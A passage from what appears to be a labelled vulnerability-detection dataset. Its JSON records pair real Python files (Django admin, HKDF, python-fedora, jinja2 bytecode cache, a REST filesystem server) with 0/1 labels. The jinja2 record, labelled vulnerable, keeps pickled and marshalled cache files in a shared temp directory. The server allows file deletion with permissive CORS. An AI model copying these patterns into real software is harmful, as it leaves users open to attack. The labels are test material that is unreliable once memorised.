# for ordering specified on ModelAdmin or model Meta, we don't know\n            # the right column numbers absolutely, because there might be more\n            # than one column associated with that ordering, so we guess.\n            for field in ordering:\n                if field.startswith('-'):\n                    field = field[1:]\n                    order_type = 'desc'\n                else:\n                    order_type = 'asc'\n                for index, attr in enumerate(self.list_display):\n                    if self.get_ordering_field(attr) == field:\n                        ordering_fields[index] = order_type\n                        break\n        else:\n            for p in self.params[ORDER_VAR].split('.'):\n                none, pfx, idx = p.rpartition('-')\n                try:\n                    idx = int(idx)\n                except ValueError:\n                    continue  # skip it\n                ordering_fields[idx] = 'desc' if pfx == '-' else 'asc'\n        return ordering_fields\n\n    def get_queryset(self, request):\n        # First, we collect all the declared list filters.\n        (self.filter_specs, self.has_filters, remaining_lookup_params,\n         filters_use_distinct) = self.get_filters(request)\n\n        # Then, we let every list filter modify the queryset to its liking.\n        qs = self.root_queryset\n        for filter_spec in self.filter_specs:\n            new_qs = filter_spec.queryset(request, qs)\n            if new_qs is not None:\n                qs = new_qs\n\n        try:\n            # Finally, we apply the remaining lookup parameters from the query\n            # string (i.e. those that haven't already been processed by the\n            # filters).\n            qs = qs.filter(**remaining_lookup_params)\n        except (SuspiciousOperation, ImproperlyConfigured):\n            # Allow certain types of errors to be re-raised as-is so that the\n            # caller can treat them in a special way.\n            raise\n        except Exception as e:\n            # Every other error is caught with a naked except, because we don't\n            # have any other way of validating lookup parameters. They might be\n            # invalid if the keyword arguments are incorrect, or if the values\n            # are not in the correct type, so we might get FieldError,\n            # ValueError, ValidationError, or ?.\n            raise IncorrectLookupParameters(e)\n\n        if not qs.query.select_related:\n            qs = self.apply_select_related(qs)\n\n        # Set ordering.\n        ordering = self.get_ordering(request, qs)\n        qs = qs.order_by(*ordering)\n\n        # Apply search results\n        qs, search_use_distinct = self.model_admin.get_search_results(\n            request, qs, self.query)\n\n        # Remove duplicates from results, if necessary\n        if filters_use_distinct | search_use_distinct:\n            return qs.distinct()\n        else:\n            return qs\n\n    def apply_select_related(self, qs):\n        if self.list_select_related is True:\n            return qs.select_related()\n\n        if self.list_select_related is False:\n            if self.has_related_field_in_list_display():\n                return qs.select_related()\n\n        if self.list_select_related:\n            return qs.select_related(*self.list_select_related)\n        return qs\n\n    def has_related_field_in_list_display(self):\n        for field_name in self.list_display:\n            try:\n                field = self.lookup_opts.get_field(field_name)\n            except models.FieldDoesNotExist:\n                pass\n            else:\n                if isinstance(field.rel, models.ManyToOneRel):\n                    return True\n        return False\n\n    def url_for_result(self, result):\n        pk = getattr(result, self.pk_attname)\n        return reverse('admin:%s_%s_change' % (self.opts.app_label,\n                                               self.opts.model_name),\n                       args=(quote(pk),),\n                       current_app=self.model_admin.admin_site.name)\n", "target": 0}
{"idx": 1025, "func": "# This file is dual licensed under the terms of the Apache License, Version\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\n# for complete details.\n\nfrom __future__ import absolute_import, division, print_function\n\nimport six\n\nfrom cryptography import utils\nfrom cryptography.exceptions import (\n    AlreadyFinalized, InvalidKey, UnsupportedAlgorithm, _Reasons\n)\nfrom cryptography.hazmat.backends.interfaces import HMACBackend\nfrom cryptography.hazmat.primitives import constant_time, hmac\nfrom cryptography.hazmat.primitives.kdf import KeyDerivationFunction\n\n\n@utils.register_interface(KeyDerivationFunction)\nclass HKDF(object):\n    def __init__(self, algorithm, length, salt, info, backend):\n        if not isinstance(backend, HMACBackend):\n            raise UnsupportedAlgorithm(\n                \"Backend object does not implement HMACBackend.\",\n                _Reasons.BACKEND_MISSING_INTERFACE\n            )\n\n        self._algorithm = algorithm\n\n        if not (salt is None or isinstance(salt, bytes)):\n            raise TypeError(\"salt must be bytes.\")\n\n        if salt is None:\n            salt = b\"\\x00\" * (self._algorithm.digest_size // 8)\n\n        self._salt = salt\n\n        self._backend = backend\n\n        self._hkdf_expand = HKDFExpand(self._algorithm, length, info, backend)\n\n    def _extract(self, key_material):\n        h = hmac.HMAC(self._salt, self._algorithm, backend=self._backend)\n        h.update(key_material)\n        return h.finalize()\n\n    def derive(self, key_material):\n        if not isinstance(key_material, bytes):\n            raise TypeError(\"key_material must be bytes.\")\n\n        return self._hkdf_expand.derive(self._extract(key_material))\n\n    def verify(self, key_material, expected_key):\n        if not constant_time.bytes_eq(self.derive(key_material), expected_key):\n            raise InvalidKey\n\n\n@utils.register_interface(KeyDerivationFunction)\nclass HKDFExpand(object):\n    def __init__(self, algorithm, length, info, backend):\n        if not isinstance(backend, HMACBackend):\n            raise UnsupportedAlgorithm(\n                \"Backend object does not implement HMACBackend.\",\n                _Reasons.BACKEND_MISSING_INTERFACE\n            )\n\n        self._algorithm = algorithm\n\n        self._backend = backend\n\n        max_length = 255 * (algorithm.digest_size // 8)\n\n        if length > max_length:\n            raise ValueError(\n                \"Can not derive keys larger than {0} octets.\".format(\n                    max_length\n                ))\n\n        self._length = length\n\n        if not (info is None or isinstance(info, bytes)):\n            raise TypeError(\"info must be bytes.\")\n\n        if info is None:\n            info = b\"\"\n\n        self._info = info\n\n        self._used = False\n\n    def _expand(self, key_material):\n        output = [b\"\"]\n        counter = 1\n\n        while self._algorithm.digest_size * (len(output) - 1) < self._length:\n            h = hmac.HMAC(key_material, self._algorithm, backend=self._backend)\n            h.update(output[-1])\n            h.update(self._info)\n            h.update(six.int2byte(counter))\n            output.append(h.finalize())\n            counter += 1\n\n        return b\"\".join(output)[:self._length]\n\n    def derive(self, key_material):\n        if not isinstance(key_material, bytes):\n            raise TypeError(\"key_material must be bytes.\")\n\n        if self._used:\n            raise AlreadyFinalized\n\n        self._used = True\n        return self._expand(key_material)\n\n    def verify(self, key_material, expected_key):\n        if not constant_time.bytes_eq(self.derive(key_material), expected_key):\n            raise InvalidKey\n", "target": 0}
{"idx": 1026, "func": "# -*- coding: utf-8 -*-\n#\n# Copyright (C) 2008-2012  Red Hat, Inc.\n# Copyright (C) 2008  Ricky Zhou\n# This file is part of python-fedora\n#\n# python-fedora is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# python-fedora is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with python-fedora; if not, see <http://www.gnu.org/licenses/>\n#\n'''\nMiscellaneous functions of use on a TurboGears Server\n\n.. versionchanged:: 0.3.14\n   Save the original turbogears.url function as :func:`fedora.tg.util.tg_url`\n\n.. versionchanged:: 0.3.17\n   Renamed from fedora.tg.util\n\n.. versionchanged:: 0.3.25\n   Renamed from fedora.tg.tg1utils\n\n.. moduleauthor:: Toshio Kuratomi <tkuratom@redhat.com>\n.. moduleauthor:: Ricky Zhou <ricky@fedoraproject.org>\n'''\nfrom itertools import chain\nimport cgi\nimport os\n\nimport cherrypy\nfrom cherrypy import request\nfrom decorator import decorator\nimport pkg_resources\nimport turbogears\nfrom turbogears import flash, redirect, config, identity\nimport turbogears.util as tg_util\nfrom turbogears.controllers import check_app_root\nfrom turbogears.identity.exceptions import RequestRequiredException\nimport six\nfrom six.moves.urllib.parse import urlencode, urlparse, urlunparse\n\n\n# Save this for people who need the original url() function\ntg_url = turbogears.url\n\n\ndef add_custom_stdvars(new_vars):\n    return new_vars.update({'fedora_template': fedora_template})\n\n\ndef url(tgpath, tgparams=None, **kwargs):\n    '''Computes URLs.\n\n    This is a replacement for :func:`turbogears.controllers.url` (aka\n    :func:`tg.url` in the template).  In addition to the functionality that\n    :func:`tg.url` provides, it adds a token to prevent :term:`CSRF` attacks.\n\n    :arg tgpath:  a list or a string. If the path is absolute (starts\n        with a \"/\"), the :attr:`server.webpath`, :envvar:`SCRIPT_NAME` and\n        the approot of the application are prepended to the path. In order for\n        the approot to be detected properly, the root object should extend\n        :class:`turbogears.controllers.RootController`.\n    :kwarg tgparams: See param: ``kwargs``\n    :kwarg kwargs: Query parameters for the URL can be passed in as a\n        dictionary in the second argument *or* as keyword parameters.\n        Values which are a list or a tuple are used to create multiple\n        key-value pairs.\n    :returns: The changed path\n\n    .. versionadded:: 0.3.10\n       Modified from turbogears.controllers.url for :ref:`CSRF-Protection`\n    '''\n    if not isinstance(tgpath, six.string_types):\n        tgpath = '/'.join(list(tgpath))\n    if not tgpath.startswith('/'):\n        # Do not allow the url() function to be used for external urls.\n        # This function is primarily used in redirect() calls, so this prevents\n        # covert redirects and thus CSRF leaking.\n        tgpath = '/'\n    if tgpath.startswith('/'):\n        webpath = (config.get('server.webpath') or '').rstrip('/')\n        if tg_util.request_available():\n            check_app_root()\n            tgpath = request.app_root + tgpath\n            try:\n                webpath += request.wsgi_environ['SCRIPT_NAME'].rstrip('/')\n            except (AttributeError, KeyError):  # pylint: disable-msg=W0704\n                # :W0704: Lack of wsgi environ is fine... we still have\n                # server.webpath\n                pass\n        tgpath = webpath + tgpath\n    if tgparams is None:\n        tgparams = kwargs\n    else:\n        try:\n            tgparams = tgparams.copy()\n            tgparams.update(kwargs)\n        except AttributeError:\n            raise TypeError(\n                'url() expects a dictionary for query parameters')\n    args = []\n    # Add the _csrf_token\n    try:\n        if identity.current.csrf_token:\n            tgparams.update({'_csrf_token': identity.current.csrf_token})\n    except RequestRequiredException:  # pylint: disable-msg=W0704\n        # :W0704: If we are outside of a request (called from non-controller\n        # methods/ templates) just don't set the _csrf_token.\n        pass\n\n    # Check for query params in the current url\n    query_params = six.iteritems(tgparams)\n    scheme, netloc, path, params, query_s, fragment = urlparse(tgpath)\n    if query_s:\n        query_params = chain((p for p in cgi.parse_qsl(query_s) if p[0] !=\n                              '_csrf_token'), query_params)\n\n    for key, value in query_params:\n        if value is None:\n            continue\n        if isinstance(value, (list, tuple)):\n            pairs = [(key, v) for v in value]\n        else:\n            pairs = [(key, value)]\n        for key, value in pairs:\n            if value is None:\n                continue\n            if isinstance(value, unicode):\n                value = value.encode('utf8')\n            args.append((key, str(value)))\n    query_string = urlencode(args, True)\n    tgpath = urlunparse((scheme, netloc, path, params, query_string, fragment))\n    return tgpath\n\n\n# this is taken from turbogears 1.1 branch\ndef _get_server_name():\n    \"\"\"Return name of the server this application runs on.\n\n    Respects 'Host' and 'X-Forwarded-Host' header.\n\n    See the docstring of the 'absolute_url' function for more information.\n\n    .. note:: This comes from turbogears 1.1 branch.  It is only needed for\n        _tg_absolute_url().  If we find that turbogears.get_server_name()\n        exists, we replace this function with that one.\n    \"\"\"\n    get = config.get\n    h = request.headers\n    host = get('tg.url_domain') or h.get('X-Forwarded-Host', h.get('Host'))\n    if not host:\n        host = '%s:%s' % (get('server.socket_host', 'localhost'),\n                          get('server.socket_port', 8080))\n    return host\n\n\n# this is taken from turbogears 1.1 branch\ndef tg_absolute_url(tgpath='/', params=None, **kw):\n    \"\"\"Return absolute URL (including schema and host to this server).\n\n    Tries to account for 'Host' header and reverse proxying\n    ('X-Forwarded-Host').\n\n    The host name is determined this way:\n\n    * If the config setting 'tg.url_domain' is set and non-null, use this\n      value.\n    * Else, if the 'base_url_filter.use_x_forwarded_host' config setting is\n      True, use the value from the 'Host' or 'X-Forwarded-Host' request header.\n    * Else, if config setting 'base_url_filter.on' is True and\n      'base_url_filter.base_url' is non-null, use its value for the host AND\n      scheme part of the URL.\n    * As a last fallback, use the value of 'server.socket_host' and\n      'server.socket_port' config settings (defaults to 'localhost:8080').\n\n    The URL scheme ('http' or 'http') used is determined in the following way:\n\n    * If 'base_url_filter.base_url' is used, use the scheme from this URL.\n    * If there is a 'X-Use-SSL' request header, use 'https'.\n    * Else, if the config setting 'tg.url_scheme' is set, use its value.\n    * Else, use the value of 'cherrypy.request.scheme'.\n\n    .. note:: This comes from turbogears 1.1 branch with one change: we\n        call tg_url() rather than turbogears.url() so that it never adds the\n        csrf_token\n\n    .. versionadded:: 0.3.19\n       Modified from turbogears.absolute_url() for :ref:`CSRF-Protection`\n    \"\"\"\n    get = config.get\n    use_xfh = get('base_url_filter.use_x_forwarded_host', False)\n    if request.headers.get('X-Use-SSL'):\n        scheme = 'https'\n    else:\n        scheme = get('tg.url_scheme')\n    if not scheme:\n        scheme = request.scheme\n    base_url = '%s://%s' % (scheme, _get_server_name())\n    if get('base_url_filter.on', False) and not use_xfh:\n        base_url = get('base_url_filter.base_url').rstrip('/')\n    return '%s%s' % (base_url, tg_url(tgpath, params, **kw))\n\n\ndef absolute_url(tgpath='/', params=None, **kw):\n    \"\"\"Return absolute URL (including schema and host to this server).\n\n    Tries to account for 'Host' header and reverse proxying\n    ('X-Forwarded-Host').\n\n    The host name is determined this way:\n\n    * If the config setting 'tg.url_domain' is set and non-null, use this\n      value.\n    * Else, if the 'base_url_filter.use_x_forwarded_host' config setting is\n      True, use the value from the 'Host' or 'X-Forwarded-Host' request header.\n    * Else, if config setting 'base_url_filter.on' is True and\n      'base_url_filter.base_url' is non-null, use its value for the host AND\n      scheme part of the URL.\n    * As a last fallback, use the value of 'server.socket_host' and\n      'server.socket_port' config settings (defaults to 'localhost:8080').\n\n    The URL scheme ('http' or 'http') used is determined in the following way:\n\n    * If 'base_url_filter.base_url' is used, use the scheme from this URL.\n    * If there is a 'X-Use-SSL' request header, use 'https'.\n    * Else, if the config setting 'tg.url_scheme' is set, use its value.\n    * Else, use the value of 'cherrypy.request.scheme'.\n\n    .. versionadded:: 0.3.19\n       Modified from turbogears.absolute_url() for :ref:`CSRF-Protection`\n    \"\"\"\n    return url(tg_absolute_url(tgpath, params, **kw))\n\n\ndef enable_csrf():\n    '''A startup function to setup :ref:`CSRF-Protection`.\n\n    This should be run at application startup.  Code like the following in the\n    start-APP script or the method in :file:`commands.py` that starts it::\n\n        from turbogears import startup\n        from fedora.tg.util import enable_csrf\n        startup.call_on_startup.append(enable_csrf)\n\n    If we can get the :ref:`CSRF-Protection` into upstream :term:`TurboGears`,\n    we might be able to remove this in the future.\n\n    .. versionadded:: 0.3.10\n       Added to enable :ref:`CSRF-Protection`\n    '''\n    # Override the turbogears.url function with our own\n    # Note, this also changes turbogears.absolute_url since that calls\n    # turbogears.url\n    turbogears.url = url\n    turbogears.controllers.url = url\n\n    # Ignore the _csrf_token parameter\n    ignore = config.get('tg.ignore_parameters', [])\n    if '_csrf_token' not in ignore:\n        ignore.append('_csrf_token')\n        config.update({'tg.ignore_parameters': ignore})\n\n    # Add a function to the template tg stdvars that looks up a template.\n    turbogears.view.variable_providers.append(add_custom_stdvars)\n\n\ndef request_format():\n    '''Return the output format that was requested by the user.\n\n    The user is able to specify a specific output format using either the\n    ``Accept:`` HTTP header or the ``tg_format`` query parameter.  This\n    function checks both of those to determine what format the reply should\n    be in.\n\n    :rtype: string\n    :returns: The requested format.  If none was specified, 'default' is\n        returned\n\n    .. versionchanged:: 0.3.17\n        Return symbolic names for json, html, xhtml, and xml instead of\n        letting raw mime types through\n    '''\n    output_format = cherrypy.request.params.get('tg_format', '').lower()\n    if not output_format:\n        ### TODO: Two problems with this:\n        # 1) TG lets this be extended via as_format and accept_format.  We need\n        #    tie into that as well somehow.\n        # 2) Decide whether to standardize on \"json\" or \"application/json\"\n        accept = tg_util.simplify_http_accept_header(\n            request.headers.get('Accept', 'default').lower())\n        if accept in ('text/javascript', 'application/json'):\n            output_format = 'json'\n        elif accept == 'text/html':\n            output_format = 'html'\n        elif accept == 'text/plain':\n            output_format = 'plain'\n        elif accept == 'text/xhtml':\n            output_format = 'xhtml'\n        elif accept == 'text/xml':\n            output_format = 'xml'\n        else:\n            output_format = accept\n    return output_format\n\n\ndef jsonify_validation_errors():\n    '''Return an error for :term:`JSON` if validation failed.\n\n    This function checks for two things:\n\n    1) We're expected to return :term:`JSON` data.\n    2) There were errors in the validation process.\n\n    If both of those are true, this function constructs a response that\n    will return the validation error messages as :term:`JSON` data.\n\n    All controller methods that are error_handlers need to use this::\n\n        @expose(template='templates.numberform')\n        def enter_number(self, number):\n            errors = fedora.tg.util.jsonify_validation_errors()\n            if errors:\n                return errors\n            [...]\n\n        @expose(allow_json=True)\n        @error_handler(enter_number)\n        @validate(form=number_form)\n        def save(self, number):\n            return dict(success=True)\n\n    :rtype: None or dict\n    :Returns: None if there are no validation errors or :term:`JSON` isn't\n        requested, otherwise a dictionary with the error that's suitable for\n        return from the controller.  The error message is set in tg_flash\n        whether :term:`JSON` was requested or not.\n    '''\n    # Check for validation errors\n    errors = getattr(cherrypy.request, 'validation_errors', None)\n    if not errors:\n        return None\n\n    # Set the message for both html and json output\n    message = u'\\n'.join([u'%s: %s' % (param, msg) for param, msg in\n                          errors.items()])\n    format = request_format()\n    if format in ('html', 'xhtml'):\n        message.translate({ord('\\n'): u'<br />\\n'})\n    flash(message)\n\n    # If json, return additional information to make this an exception\n    if format == 'json':\n        # Note: explicit setting of tg_template is needed in TG < 1.0.4.4\n        # A fix has been applied for TG-1.0.4.5\n        return dict(exc='Invalid', tg_template='json')\n    return None\n\n\ndef json_or_redirect(forward_url):\n    '''If :term:`JSON` is requested, return a dict, otherwise redirect.\n\n    This is a decorator to use with a method that returns :term:`JSON` by\n    default.  If :term:`JSON` is requested, then it will return the dict from\n    the method.  If :term:`JSON` is not requested, it will redirect to the\n    given URL.  The method that is decorated should be constructed so that it\n    calls turbogears.flash() with a message that will be displayed on the\n    forward_url page.\n\n    Use it like this::\n\n        import turbogears\n\n        @json_or_redirect('http://localhost/calc/')\n        @expose(allow_json=True)\n        def divide(self, dividend, divisor):\n            try:\n                answer = dividend * 1.0 / divisor\n            except ZeroDivisionError:\n                turbogears.flash('Division by zero not allowed')\n                return dict(exc='ZeroDivisionError')\n            turbogears.flash('The quotient is %s' % answer)\n            return dict(quotient=answer)\n\n    In the example, we return either an exception or an answer, using\n    :func:`turbogears.flash` to tell people of the result in either case.  If\n    :term:`JSON` data is requested, the user will get back a :term:`JSON`\n    string with the proper information.  If html is requested, we will be\n    redirected to 'http://localhost/calc/' where the flashed message will be\n    displayed.\n\n    :arg forward_url: If :term:`JSON` was not requested, redirect to this URL\n        after.\n\n    .. versionadded:: 0.3.7\n       To make writing methods that use validation easier\n    '''\n    def call(func, *args, **kwargs):\n        if request_format() == 'json':\n            return func(*args, **kwargs)\n        else:\n            func(*args, **kwargs)\n            raise redirect(forward_url)\n    return decorator(call)\n\nif hasattr(turbogears, 'get_server_name'):\n    _get_server_name = turbogears.get_server_name\n\n\ndef fedora_template(template, template_type='genshi'):\n    '''Function to return the path to a template.\n\n    :arg template: filename of the template itself.  Ex: login.html\n    :kwarg template_type: template language we need the template written in\n        Defaults to 'genshi'\n    :returns: filesystem path to the template\n    '''\n    # :E1101: pkg_resources does have resource_filename\n    # pylint: disable-msg=E1101\n    return pkg_resources.resource_filename(\n        'fedora', os.path.join('tg',\n                               'templates', template_type, template))\n\n__all__ = (\n    'add_custom_stdvars', 'absolute_url', 'enable_csrf',\n    'fedora_template', 'jsonify_validation_errors', 'json_or_redirect',\n    'request_format', 'tg_absolute_url', 'tg_url', 'url')\n", "target": 0}
{"idx": 1027, "func": "# -*- coding: utf-8 -*-\n\"\"\"\n    jinja2.bccache\n    ~~~~~~~~~~~~~~\n\n    This module implements the bytecode cache system Jinja is optionally\n    using.  This is useful if you have very complex template situations and\n    the compiliation of all those templates slow down your application too\n    much.\n\n    Situations where this is useful are often forking web applications that\n    are initialized on the first request.\n\n    :copyright: (c) 2010 by the Jinja Team.\n    :license: BSD.\n\"\"\"\nfrom os import path, listdir\nimport sys\nimport marshal\nimport tempfile\nimport fnmatch\nfrom hashlib import sha1\nfrom jinja2.utils import open_if_exists\nfrom jinja2._compat import BytesIO, pickle, PY2, text_type\n\n\n# marshal works better on 3.x, one hack less required\nif not PY2:\n    marshal_dump = marshal.dump\n    marshal_load = marshal.load\nelse:\n\n    def marshal_dump(code, f):\n        if isinstance(f, file):\n            marshal.dump(code, f)\n        else:\n            f.write(marshal.dumps(code))\n\n    def marshal_load(f):\n        if isinstance(f, file):\n            return marshal.load(f)\n        return marshal.loads(f.read())\n\n\nbc_version = 2\n\n# magic version used to only change with new jinja versions.  With 2.6\n# we change this to also take Python version changes into account.  The\n# reason for this is that Python tends to segfault if fed earlier bytecode\n# versions because someone thought it would be a good idea to reuse opcodes\n# or make Python incompatible with earlier versions.\nbc_magic = 'j2'.encode('ascii') + \\\n    pickle.dumps(bc_version, 2) + \\\n    pickle.dumps((sys.version_info[0] << 24) | sys.version_info[1])\n\n\nclass Bucket(object):\n    \"\"\"Buckets are used to store the bytecode for one template.  It's created\n    and initialized by the bytecode cache and passed to the loading functions.\n\n    The buckets get an internal checksum from the cache assigned and use this\n    to automatically reject outdated cache material.  Individual bytecode\n    cache subclasses don't have to care about cache invalidation.\n    \"\"\"\n\n    def __init__(self, environment, key, checksum):\n        self.environment = environment\n        self.key = key\n        self.checksum = checksum\n        self.reset()\n\n    def reset(self):\n        \"\"\"Resets the bucket (unloads the bytecode).\"\"\"\n        self.code = None\n\n    def load_bytecode(self, f):\n        \"\"\"Loads bytecode from a file or file like object.\"\"\"\n        # make sure the magic header is correct\n        magic = f.read(len(bc_magic))\n        if magic != bc_magic:\n            self.reset()\n            return\n        # the source code of the file changed, we need to reload\n        checksum = pickle.load(f)\n        if self.checksum != checksum:\n            self.reset()\n            return\n        self.code = marshal_load(f)\n\n    def write_bytecode(self, f):\n        \"\"\"Dump the bytecode into the file or file like object passed.\"\"\"\n        if self.code is None:\n            raise TypeError('can\\'t write empty bucket')\n        f.write(bc_magic)\n        pickle.dump(self.checksum, f, 2)\n        marshal_dump(self.code, f)\n\n    def bytecode_from_string(self, string):\n        \"\"\"Load bytecode from a string.\"\"\"\n        self.load_bytecode(BytesIO(string))\n\n    def bytecode_to_string(self):\n        \"\"\"Return the bytecode as string.\"\"\"\n        out = BytesIO()\n        self.write_bytecode(out)\n        return out.getvalue()\n\n\nclass BytecodeCache(object):\n    \"\"\"To implement your own bytecode cache you have to subclass this class\n    and override :meth:`load_bytecode` and :meth:`dump_bytecode`.  Both of\n    these methods are passed a :class:`~jinja2.bccache.Bucket`.\n\n    A very basic bytecode cache that saves the bytecode on the file system::\n\n        from os import path\n\n        class MyCache(BytecodeCache):\n\n            def __init__(self, directory):\n                self.directory = directory\n\n            def load_bytecode(self, bucket):\n                filename = path.join(self.directory, bucket.key)\n                if path.exists(filename):\n                    with open(filename, 'rb') as f:\n                        bucket.load_bytecode(f)\n\n            def dump_bytecode(self, bucket):\n                filename = path.join(self.directory, bucket.key)\n                with open(filename, 'wb') as f:\n                    bucket.write_bytecode(f)\n\n    A more advanced version of a filesystem based bytecode cache is part of\n    Jinja2.\n    \"\"\"\n\n    def load_bytecode(self, bucket):\n        \"\"\"Subclasses have to override this method to load bytecode into a\n        bucket.  If they are not able to find code in the cache for the\n        bucket, it must not do anything.\n        \"\"\"\n        raise NotImplementedError()\n\n    def dump_bytecode(self, bucket):\n        \"\"\"Subclasses have to override this method to write the bytecode\n        from a bucket back to the cache.  If it unable to do so it must not\n        fail silently but raise an exception.\n        \"\"\"\n        raise NotImplementedError()\n\n    def clear(self):\n        \"\"\"Clears the cache.  This method is not used by Jinja2 but should be\n        implemented to allow applications to clear the bytecode cache used\n        by a particular environment.\n        \"\"\"\n\n    def get_cache_key(self, name, filename=None):\n        \"\"\"Returns the unique hash key for this template name.\"\"\"\n        hash = sha1(name.encode('utf-8'))\n        if filename is not None:\n            filename = '|' + filename\n            if isinstance(filename, text_type):\n                filename = filename.encode('utf-8')\n            hash.update(filename)\n        return hash.hexdigest()\n\n    def get_source_checksum(self, source):\n        \"\"\"Returns a checksum for the source.\"\"\"\n        return sha1(source.encode('utf-8')).hexdigest()\n\n    def get_bucket(self, environment, name, filename, source):\n        \"\"\"Return a cache bucket for the given template.  All arguments are\n        mandatory but filename may be `None`.\n        \"\"\"\n        key = self.get_cache_key(name, filename)\n        checksum = self.get_source_checksum(source)\n        bucket = Bucket(environment, key, checksum)\n        self.load_bytecode(bucket)\n        return bucket\n\n    def set_bucket(self, bucket):\n        \"\"\"Put the bucket into the cache.\"\"\"\n        self.dump_bytecode(bucket)\n\n\nclass FileSystemBytecodeCache(BytecodeCache):\n    \"\"\"A bytecode cache that stores bytecode on the filesystem.  It accepts\n    two arguments: The directory where the cache items are stored and a\n    pattern string that is used to build the filename.\n\n    If no directory is specified the system temporary items folder is used.\n\n    The pattern can be used to have multiple separate caches operate on the\n    same directory.  The default pattern is ``'__jinja2_%s.cache'``.  ``%s``\n    is replaced with the cache key.\n\n    >>> bcc = FileSystemBytecodeCache('/tmp/jinja_cache', '%s.cache')\n\n    This bytecode cache supports clearing of the cache using the clear method.\n    \"\"\"\n\n    def __init__(self, directory=None, pattern='__jinja2_%s.cache'):\n        if directory is None:\n            directory = tempfile.gettempdir()\n        self.directory = directory\n        self.pattern = pattern\n\n    def _get_cache_filename(self, bucket):\n        return path.join(self.directory, self.pattern % bucket.key)\n\n    def load_bytecode(self, bucket):\n        f = open_if_exists(self._get_cache_filename(bucket), 'rb')\n        if f is not None:\n            try:\n                bucket.load_bytecode(f)\n            finally:\n                f.close()\n\n    def dump_bytecode(self, bucket):\n        f = open(self._get_cache_filename(bucket), 'wb')\n        try:\n            bucket.write_bytecode(f)\n        finally:\n            f.close()\n\n    def clear(self):\n        # imported lazily here because google app-engine doesn't support\n        # write access on the file system and the function does not exist\n        # normally.\n        from os import remove\n        files = fnmatch.filter(listdir(self.directory), self.pattern % '*')\n        for filename in files:\n            try:\n                remove(path.join(self.directory, filename))\n            except OSError:\n                pass\n\n\nclass MemcachedBytecodeCache(BytecodeCache):\n    \"\"\"This class implements a bytecode cache that uses a memcache cache for\n    storing the information.  It does not enforce a specific memcache library\n    (tummy's memcache or cmemcache) but will accept any class that provides\n    the minimal interface required.\n\n    Libraries compatible with this class:\n\n    -   `werkzeug <http://werkzeug.pocoo.org/>`_.contrib.cache\n    -   `python-memcached <http://www.tummy.com/Community/software/python-memcached/>`_\n    -   `cmemcache <http://gijsbert.org/cmemcache/>`_\n\n    (Unfortunately the django cache interface is not compatible because it\n    does not support storing binary data, only unicode.  You can however pass\n    the underlying cache client to the bytecode cache which is available\n    as `django.core.cache.cache._client`.)\n\n    The minimal interface for the client passed to the constructor is this:\n\n    .. class:: MinimalClientInterface\n\n        .. method:: set(key, value[, timeout])\n\n            Stores the bytecode in the cache.  `value` is a string and\n            `timeout` the timeout of the key.  If timeout is not provided\n            a default timeout or no timeout should be assumed, if it's\n            provided it's an integer with the number of seconds the cache\n            item should exist.\n\n        .. method:: get(key)\n\n            Returns the value for the cache key.  If the item does not\n            exist in the cache the return value must be `None`.\n\n    The other arguments to the constructor are the prefix for all keys that\n    is added before the actual cache key and the timeout for the bytecode in\n    the cache system.  We recommend a high (or no) timeout.\n\n    This bytecode cache does not support clearing of used items in the cache.\n    The clear method is a no-operation function.\n\n    .. versionadded:: 2.7\n       Added support for ignoring memcache errors through the\n       `ignore_memcache_errors` parameter.\n    \"\"\"\n\n    def __init__(self, client, prefix='jinja2/bytecode/', timeout=None,\n                 ignore_memcache_errors=True):\n        self.client = client\n        self.prefix = prefix\n        self.timeout = timeout\n        self.ignore_memcache_errors = ignore_memcache_errors\n\n    def load_bytecode(self, bucket):\n        try:\n            code = self.client.get(self.prefix + bucket.key)\n        except Exception:\n            if not self.ignore_memcache_errors:\n                raise\n            code = None\n        if code is not None:\n            bucket.bytecode_from_string(code)\n\n    def dump_bytecode(self, bucket):\n        args = (self.prefix + bucket.key, bucket.bytecode_to_string())\n        if self.timeout is not None:\n            args += (self.timeout,)\n        try:\n            self.client.set(*args)\n        except Exception:\n            if not self.ignore_memcache_errors:\n                raise\n", "target": 1}
{"idx": 1028, "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\"\"\"\nRESTful Filesystem access using HTTP\n------------------------------------\n\nThis controller and helper classes exposes parts or all of the server's\nfilesystem. Means to retrieve and delete files are provided as well as the\nability to list folder contents.\n\nThe generated responses are returned as JSON data with appropriate HTTP headers.\nOutput will be compressed using gzip most of the times.\n\nExample calls using curl\n++++++++++++++++++++++++\n\nThe following examples assume that the FileController instance is accessible\nas '/file' on 'localhost', port 18888 (http://localhost:18888/file).\n\nFetch list of files and folders in root folder:\n\n    curl --noproxy localhost -iv http://localhost:18888/file\n\nFetch example file 'example.txt'\n\n    curl --noproxy localhost -iv http://localhost:18888/file/example.txt\n\nFetch gzipped example file 'example.txt'\n\n    curl --compressed -H \"Accept-Encoding: gzip\" --noproxy localhost -iv http://localhost:18888/file/example.txt\n\nDelete example file 'example.txt'\n\n    curl --noproxy localhost -iv -X DELETE http://localhost:18888/file/example.txt\n\n\"\"\"\nimport os\nimport json\nimport glob\nimport re\nimport urlparse\n\nimport twisted.web.static\nfrom twisted.web import http\n\nfrom utilities import MANY_SLASHES_REGEX\nimport file\n\n#: default path from which files will be served\nDEFAULT_ROOT_PATH = os.path.abspath(os.path.dirname(__file__))\n\n#: CORS - HTTP headers the client may use\nCORS_ALLOWED_CLIENT_HEADERS = [\n\t'Content-Type',\n]\n\n#: CORS - HTTP methods the client may use\nCORS_ALLOWED_METHODS_DEFAULT = ['GET', 'PUT', 'POST', 'DELETE', 'OPTIONS']\n\n#: CORS - default origin header value\nCORS_DEFAULT_ALLOW_ORIGIN = '*'\n\n#: CORS - HTTP headers the server will send as part of OPTIONS response\nCORS_DEFAULT = {\n\t'Access-Control-Allow-Origin': CORS_DEFAULT_ALLOW_ORIGIN,\n\t'Access-Control-Allow-Credentials': 'true',\n\t'Access-Control-Max-Age': '86400',\n\t'Access-Control-Allow-Methods': ','.join(CORS_ALLOWED_METHODS_DEFAULT),\n\t'Access-Control-Allow-Headers': ', 